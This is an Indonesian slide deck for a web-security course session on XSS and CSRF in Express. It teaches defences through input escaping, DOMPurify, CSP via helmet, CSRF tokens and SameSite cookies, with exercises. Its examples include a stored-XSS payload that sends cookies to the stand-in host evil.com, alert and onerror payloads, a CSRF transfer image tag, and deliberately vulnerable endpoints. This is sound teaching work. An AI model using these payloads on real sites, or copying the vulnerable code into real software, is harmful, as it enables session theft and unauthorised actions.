---
marp: true
theme: rpl
paginate: true
header: "RPL AI Curriculum — <img src="https://images.pexels.com/photos/5380664/pexels-ph"
footer: "Sesi 02: Xss Csrf"
---

<!-- _class: title -->
# Sesi 2: XSS & CSRF

> **Durasi:** 2 jam
> **Tujuan:** Paham XSS & CSRF, bisa implementasi perlindungan di Express

---

## XSS — Cross-Site Scripting

XSS = attacker nyuntikin **JavaScript jahat** ke halaman web. Script jalan di **browser korban** — bisa nyolong cookie, redirect ke phishing, atau ubah tampilan.

### 3 Tipe XSS

| Tipe | Cara Kerja | Tingkat Bahaya |
|------|-----------|----------------|
| **Stored XSS** | Script disimpan di database, jalan tiap kali halaman dibuka | 🔴 Paling bahaya |
| **Reflected XSS** | Script ada di URL, korban harus klik link | 🟡 Sedang |
| **DOM-based XSS** | Script jalan via JS client-side, server nggak tahu | 🟡 Sedang |

---

### Stored XSS — Contoh

Komentar di blog yang nyimpen data tanpa sanitasi:

```typescript
// ❌ RENTAN — simpan komentar mentah
app.post('/api/komentar', async (req: any, res: any) => {
  const { isi } = req.body;

  const komentar = await prisma.komentar.create({
    data: { isi, userId: req.user.id },
  });

  res.json(komentar);
});

// Attacker kirim:
// { "isi": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" }

// Tiap user buka halaman — cookie mereka dicuri!
```

### Reflected XSS — Contoh

Script lewat URL parameter:

```typescript
// ❌ RENTAN — render input langsung ke halaman
app.get('/api/search', async (req: any, res: any) => {
  const { q } = req.query;

  // Kalo pake EJS: <h2>Hasil pencarian: <%= q %></h2>
  // Dengan <%- q %> (raw) — XSS!
  res.render('search', { query: q });
});

// Attacker kirim link:
// https://site.com/search?q=<script>alert('XSS')</script>
```

---

## Pencegahan XSS

### 1. Sanitasi Input — Server Side

```typescript
import { body, validationResult } from 'express-validator';

// ✅ AMAN — escape & trim sebelum simpan
app.post('/api/komentar',
  body('isi')
    .trim()
    .escape()           // otomatis encode HTML: < jadi &lt;, > jadi &gt;
    .isLength({ min: 1, max: 1000 }),
  async (req: any, res: any) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    const komentar = await prisma.komentar.create({
      data: {
        isi: req.body.isi, // udah di-escape, aman
        userId: req.user.id,
      },
    });

    res.json(komentar);
  }
);
```

### 2. Sanitasi Output — Template Engine

```ejs
<!-- ✅ AMAN — EJS: <%= %> otomatis escape -->
<p><%= komentar.isi %></p>

<!-- ❌ RENTAN — <%- %> render raw HTML -->
<p><%- komentar.isi %></p>
```

### 3. DOMPurify — Client Side

Kalo memang perlu render HTML (rich text), pake DOMPurify:

```html
<!-- Di frontend -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
<script>
  const userInput = "<img src=x onerror=alert('XSS')>";
  const clean = DOMPurify.sanitize(userInput);
  // clean = "<img src=\"x\">" — event handler dihapus!
  document.getElementById('content').innerHTML = clean;
</script>
```

### 4. Content-Security-Policy (CSP)

**CSP** = header HTTP yang ngontrol script mana yang boleh jalan di browser. **Ini defense paling kuat lawan XSS.**

```typescript
import helmet from 'helmet';

// ✅ AMAN — helmet set CSP + berbagai header keamanan
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://trusted-cdn.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "https://images.unsplash.com"],
      connectSrc: ["'self'", "https://api.kamu.com"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
}));

// Kalo manual:
app.use((req: any, res: any, next: any) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; frame-src 'none'"
  );
  next();
});
```

**CSP directives penting:**

| Directive | Fungsi |
|-----------|--------|
| `default-src 'self'` | Fallback — cuma dari domain sendiri |
| `script-src 'self'` | Script cuma dari domain sendiri |
| `style-src 'self'` | CSS cuma dari domain sendiri |
| `img-src 'self'` | Gambar cuma dari domain sendiri |
| `object-src 'none'` | Blokir plugin (Flash, Java) |
| `frame-src 'none'` | Blokir iframe dari domain lain |

### 5. X-XSS-Protection & X-Content-Type-Options

```typescript
// Helmet otomatis set ini:
// X-XSS-Protection: 0 (disable — pake CSP aja)
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY
```

---

## CSRF — Cross-Site Request Forgery

**Cara kerja:** Attacker nipu user yang udah login buat ngelakuin aksi (transfer, ganti password, hapus data) tanpa sepengetahuan mereka.

### Flow Serangan CSRF

```
1. User login ke bank.com → dapet cookie session
2. Tanpa logout, user buka situs attacker (atau email pake gambar)
3. Situs attacker punya: <img src="http://bank.com/transfer?amount=1000000&to=attacker">
4. Browser otomatis kirim cookie bank.com — request keliatan sah!
5. Uang kepindah ke rekening attacker
```

### CSRF Prevention Methods

| Method | Cara | Level Proteksi |
|--------|------|----------------|
| CSRF Token | Token unik di tiap form/request | 🔴 Strong |
| SameSite Cookie | Attribute cookie `Strict`/`Lax` | 🟡 Strong (modern) |
| Custom Header | `X-Requested-With: XMLHttpRequest` | 🟡 Medium |
| Referer Header | Cek asal request | 🟢 Lemah (bisa di-spoof) |

---

### CSRF Token — Implementasi dengan csrf-csrf

```typescript
import { doubleCsrf } from 'csrf-csrf';
import cookieParser from 'cookie-parser';

// Setup
app.use(cookieParser(process.env.COOKIE_SECRET));

const { generateToken, validateRequest, doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieName: '__Host-psifi.x-csrf-token',
  cookieOptions: {
    httpOnly: true,
    sameSite: 'strict',
    secure: process.env.NODE_ENV === 'production',
    path: '/',
  },
  size: 64,
  getTokenFromRequest: (req) => req.headers['x-csrf-token'],
});

// Apply CSRF protection ke semua route yang mutasi data
app.use('/api', doubleCsrfProtection);

// Endpoint buat dapetin CSRF token
app.get('/api/csrf-token', (req: any, res: any) => {
  res.json({
    token: generateToken(req, res),
  });
});

// Contoh protected route
app.post('/api/transfer', async (req: any, res: any) => {
  // validateRequest udah otomatis jalan via middleware
  const { toAccount, amount } = req.body;

  // Proses transfer...
  res.json({ message: 'Transfer berhasil' });
});

// Client harus kirim:
// POST /api/transfer
// Headers:
//   X-CSRF-Token: <token dari /api/csrf-token>
//   Cookie: __Host-psifi.x-csrf-token=<token>
```

### SameSite Cookie — Alternatif Modern

Nggak perlu library tambahan. Cukup set cookie attribute `SameSite`:

```typescript
// ✅ AMAN — SameSite=Strict blokir semua request lintas situs
res.cookie('session', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',   // 'lax' = lebih longgar (allow GET navigasi)
  maxAge: 24 * 60 * 60 * 1000, // 1 hari
});

// Alternatif: SameSite=Lax — allow link navigasi, blokir POST lintas situs
res.cookie('session', token, {
  sameSite: 'lax',
});
```

| SameSite | Proteksi CSRF | Use Case |
|----------|--------------|----------|
| `Strict` | 🔴 Paling kuat | Banking, admin panel |
| `Lax` | 🟡 Cukup | Web umum (default modern browser) |
| `None` | 🟢 Nggak ada | Butuh cookie lintas domain (with Secure) |

---

## Helmet.js — Complete Security Headers

Helmet kumpulin **15+ middleware keamanan HTTP header** dalam satu package:

```typescript
import helmet from 'helmet';

// ✅ AMAN — pake default helmet
app.use(helmet());

// Kustomisasi sesuai kebutuhan
app.use(helmet({
  // CSP — paling penting buat XSS
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.example.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  // Cross-Origin Isolation
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-origin' },
  // DNS Prefetch Control
  dnsPrefetchControl: { allow: false },
  // Referrer Policy
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  // XSS Filter
  xXssProtection: false, // disable — pake CSP
  // HSTS (HTTP Strict Transport Security) — paksa HTTPS
  strictTransportSecurity: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
}));
```

**Headers yang di-set Helmet:**

| Header | Fungsi |
|--------|--------|
| `Content-Security-Policy` | Cegah XSS |
| `X-Content-Type-Options: nosniff` | Cegah MIME sniffing |
| `X-Frame-Options: DENY` | Cegah clickjacking |
| `Strict-Transport-Security` | Paksa HTTPS |
| `X-DNS-Prefetch-Control: off` | Privasi DNS |
| `Referrer-Policy` | Kontrol referer header |
| `Cross-Origin-Resource-Policy` | Cegah resource sharing lintas origin |

---

## Latihan

### Latihan 1: Audit & Fix XSS

Kode forum diskusi berikut RENTAN XSS. Temukan celah dan betulin:

```typescript
// forum.ts — Express endpoint
app.get('/api/thread/:id', async (req: any, res: any) => {
  const thread = await prisma.thread.findUnique({
    where: { id: parseInt(req.params.id) },
    include: { replies: true },
  });

  // Render pake EJS — tapi pake <%- %> (raw)!
  res.render('thread', {
    title: thread.title,
    replies: thread.replies.map((r: any) => r.content),
  });
});

app.post('/api/thread/:id/reply', async (req: any, res: any) => {
  const reply = await prisma.reply.create({
    data: {
      content: req.body.content, // ❌ simpan mentah!
      threadId: parseInt(req.params.id),
    },
  });
  res.json(reply);
});
```

**Tugas:**
1. Jelaskan 3 cara attacker bisa exploit XSS di endpoint ini
2. Fix endpoint POST — tambah sanitasi input
3. Pasang CSP header yang tepat (allow CDN buat script, blokir inline)
4. Ubah rendering ke `<%= %>` atau tambah DOMPurify

### Latihan 2: Implementasi CSRF Protection

Kasih CSRF protection ke aplikasi e-commerce sederhana:

```typescript
// TODO: Lengkapi setup CSRF
import { doubleCsrf } from 'csrf-csrf';

// 1. Setup cookie parser dengan secret
// 2. Setup doubleCsrf dengan konfigurasi:
//    - cookie name: __Host-x-csrf-token
//    - ambil token dari header X-CSRF-Token
//    - sameSite: strict
// 3. Proteksi route POST/PUT/DELETE
// 4. Buat endpoint GET /api/csrf-token

// Route yang perlu diproteksi:
app.post('/api/orders', createOrder);
app.put('/api/profile', updateProfile);
app.delete('/api/account', deleteAccount);
```

### Latihan 3: Bikin CSP Policy

Buat CSP policy buat web app berikut:

- Static assets dari CDN: `https://cdn.kamu.com`
- Google Fonts: `https://fonts.googleapis.com`, `https://fonts.gstatic.com`
- Google Analytics: `https://www.google-analytics.com`
- Gambar dari Unsplash: `https://images.unsplash.com`
- WebSocket API di: `wss://api.kamu.com`
- Inline style diperbolehkan (pake `'unsafe-inline'`)
- Inline script TIDAK diperbolehkan

```typescript
// TODO: Tulis CSP directives yang tepat
const cspDirectives = {
  defaultSrc: // ...
  scriptSrc:  // ...
  styleSrc:   // ...
  imgSrc:     // ...
  connectSrc: // ...
  fontSrc:    // ...
};
```

### Latihan 4: Same-Site Cookies vs CSRF Token

Kamu punya 2 aplikasi:

1. **Banking API** — transfer uang, ganti password, admin panel
2. **Social Media** — like, komentar, share

**Tugas:**
1. Tentukan tiap aplikasi pake SameSite apa (Strict/Lax/None)
2. Kapan CSRF token masih perlu meski udah pake SameSite?
3. Tulis konfigurasi cookie untuk kedua aplikasi

---

## Ringkasan

| Ancaman | Pencegahan Utama | Pencegahan Tambahan |
|---------|-----------------|---------------------|
| Stored XSS | Sanitasi input (escape/DOMPurify) | CSP `script-src 'self'` |
| Reflected XSS | Jangan render input mentah | CSP + `<%= %>` |
| DOM-based XSS | Hindari innerHTML | DOMPurify |
| CSRF | SameSite=Strict | CSRF token |
| Clickjacking | X-Frame-Options: DENY | Frame-Src CSP |

> **Prinsip:** XSS dicegah dari server (sanitasi) + browser (CSP). CSRF dicegah dari cookie (SameSite) + token. Jangan andelin cuma satu lapis.
